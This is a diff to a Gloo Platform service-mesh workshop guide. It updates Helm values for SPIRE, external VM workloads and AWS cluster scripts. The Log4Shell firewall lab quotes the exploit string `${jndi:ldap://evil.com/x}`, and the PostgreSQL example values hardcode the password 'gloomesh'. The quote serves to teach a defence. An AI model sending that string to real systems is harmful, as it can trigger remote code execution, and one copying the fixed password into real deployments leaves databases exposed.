@@ -117,9 +117,9 @@ export CLUSTER2=cluster2
 Run the following commands to deploy three Kubernetes clusters using [Kind](https://kind.sigs.k8s.io/):
 
 ```bash
-./scripts/deploy-multi-with-cilium.sh 1 mgmt
-./scripts/deploy-multi-with-cilium.sh 2 cluster1 us-west us-west-1
-./scripts/deploy-multi-with-cilium.sh 3 cluster2 us-west us-west-2
+./scripts/deploy-aws-with-cilium.sh 1 mgmt
+./scripts/deploy-aws-with-cilium.sh 2 cluster1 us-west us-west-1
+./scripts/deploy-aws-with-cilium.sh 3 cluster2 us-west us-west-2
 ```
 
 Then run the following commands to wait for all the Pods to be ready:
@@ -234,6 +234,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${MGMT} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -243,7 +245,7 @@ helm upgrade --install gloo-platform gloo-platform \
   --version 2.5.0 \
   -f -<<EOF
 licensing:
-  licenseKey: ${GLOO_MESH_LICENSE_KEY}
+  glooTrialLicenseKey: ${GLOO_MESH_LICENSE_KEY}
 common:
   cluster: mgmt
 glooInsightsEngine:
@@ -257,6 +259,8 @@ prometheus:
 redis:
   deployment:
     enabled: true
+featureGates:
+  ExternalWorkloads: true
 telemetryGateway:
   enabled: true
   service:
@@ -266,6 +270,7 @@ glooUi:
   serviceType: LoadBalancer
 telemetryCollector:
   enabled: true
+
 EOF
 
 kubectl --context ${MGMT} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
@@ -386,6 +391,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER1} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -407,6 +414,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster1
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 ```
 
@@ -439,6 +467,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER2} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -460,6 +490,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster2
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 ```
 
@@ -3000,7 +3051,7 @@ The Log4Shell vulnerability impacted all Java applications that used the log4j l
 
 Using the Web Application Firewall capabilities you can reject requests containing such headers. 
 
-Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That's what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
 
 Create the WAF policy:
 
@@ -4266,6 +4317,7 @@ kubectl --context ${CLUSTER1} delete accesspolicies -n bookinfo-frontends --all
 
 ## Lab 23 - VM integration with Spire <a name="lab-23---vm-integration-with-spire-"></a>
 
+
 Let's see how we can configure a VM to be part of the Mesh.
 
 To make it easier (and more fun), we'll use a Docker container to simulate a VM.
@@ -4424,9 +4476,17 @@ EOF
 
 <!--bash
 uuid_regex="^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$"
-
+start_time=$(date +%s) # Capture start time
+duration=120 # Set duration for 2 minutes (120 seconds)
 # Loop until JOIN_TOKEN matches the UUID format
 while [[ ! "${JOIN_TOKEN}" =~ ${uuid_regex} ]]; do
+    current_time=$(date +%s)
+    elapsed=$((current_time - start_time))
+    if [[ $elapsed -ge $duration ]]; then
+        echo "Timeout reached. Exiting loop."
+        break
+    fi
+
     echo "Waiting for JOIN_TOKEN to have the correct format..."
     export JOIN_TOKEN=$(meshctl external-workload gen-token --kubecontext ${CLUSTER1} --ext-workload virtualmachines/${VM_APP} --trust-domain ${CLUSTER1} --plain 2>&1 | grep INFO | awk '{ print $4}')
     sleep 1 # Pause for 1 second
@@ -4450,6 +4510,16 @@ export EW_GW_ADDR=$(kubectl --context ${CLUSTER1} -n istio-gateways get svc -l i
 ```
 
 Register the VM:
+<!--bash
+echo -n Waiting for EW be ready...
+timeout -v 1m bash -c "
+until nc -z ${EW_GW_ADDR} 31338;
+do
+  sleep 1
+  echo -n .
+done"
+echo
+-->
 
 ```bash
 export GLOO_AGENT_URL=https://storage.googleapis.com/gloo-platform/vm/v2.5.0/gloo-workload-agent.deb
@@ -5597,7 +5667,7 @@ We can use it later to check the failover hasn't impacted the Istio configuratio
 We're going to deploy a new Kubernetes cluster to host the standby Gloo Platform management plane:
 
 ```bash
-./scripts/deploy-multi-with-cilium.sh 4 mgmt2
+./scripts/deploy-aws-with-cilium.sh 4 mgmt2
 ```
 
 Then, run the following commands to wait for all the Pods to be ready:
@@ -5656,7 +5726,7 @@ helm upgrade --install gloo-platform gloo-platform \
   --version 2.5.0 \
   -f -<<EOF
 licensing:
-  licenseKey: ${GLOO_MESH_LICENSE_KEY}
+  glooTrialLicenseKey: ${GLOO_MESH_LICENSE_KEY}
 common:
   cluster: mgmt
 glooInsightsEngine:
@@ -5670,6 +5740,8 @@ prometheus:
 redis:
   deployment:
     enabled: true
+featureGates:
+  ExternalWorkloads: true
 telemetryGateway:
   enabled: true
   service:
@@ -5679,6 +5751,7 @@ glooUi:
   serviceType: LoadBalancer
 telemetryCollector:
   enabled: true
+
 EOF
 
 kubectl --context ${MGMT2} -n gloo-mesh rollout status deploy/gloo-mesh-mgmt-server
@@ -5847,6 +5920,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER1} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -5868,6 +5943,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster1
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 
 kubectl apply --context ${MGMT} -f - <<EOF
@@ -5894,6 +5990,8 @@ helm upgrade --install gloo-platform-crds gloo-platform-crds \
   --repo https://storage.googleapis.com/gloo-platform/helm-charts \
   --namespace gloo-mesh \
   --kube-context ${CLUSTER2} \
+  --set featureGates.ExternalWorkloads=true \
+  --set enabledExperimentalApi="{externalworkloads.networking.gloo.solo.io/v2alpha1,spireregistrationentries.internal.gloo.solo.io/v2alpha1}" \
   --version 2.5.0
 
 helm upgrade --install gloo-platform gloo-platform \
@@ -5915,6 +6013,27 @@ telemetryCollector:
     exporters:
       otlp:
         endpoint: "${ENDPOINT_TELEMETRY_GATEWAY}"
+glooSpireServer:
+  enabled: true
+  controller:
+    verbose: true
+  server:
+    trustDomain: cluster2
+postgresql:
+  enabled: true
+  global:
+    postgresql:
+      auth:
+        database: spire
+        password: gloomesh
+        username: spire
+telemetryCollectorCustomization:
+  pipelines:
+    metrics/otlp_relay:
+      enabled: true
+      pipeline:
+        processors:
+        - batch
 EOF
 ```
 
